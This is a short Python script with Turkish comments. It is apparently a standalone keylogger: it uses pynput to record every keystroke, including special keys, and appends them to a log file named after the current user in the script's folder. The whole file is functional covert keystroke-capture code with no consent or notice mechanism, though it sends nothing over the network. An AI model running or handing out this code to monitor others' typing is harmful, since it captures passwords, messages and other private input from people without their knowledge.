import os
import getpass
from pynput.keyboard import Listener

# Dosya yolunu kesinleştir (programın olduğu yer)
base_dir = os.path.dirname(os.path.abspath(__file__))
username = getpass.getuser()
log_file = os.path.join(base_dir, f"input_log_{username}.txt")

def on_press(key):
    try:
        # Harf ve rakamlar
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Özel tuşlar
        with open(log_file, "a", encoding="utf-8") as f:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f" [{str(key)}] ")

# Programı başlat
with Listener(on_press=on_press) as listener:
    listener.join()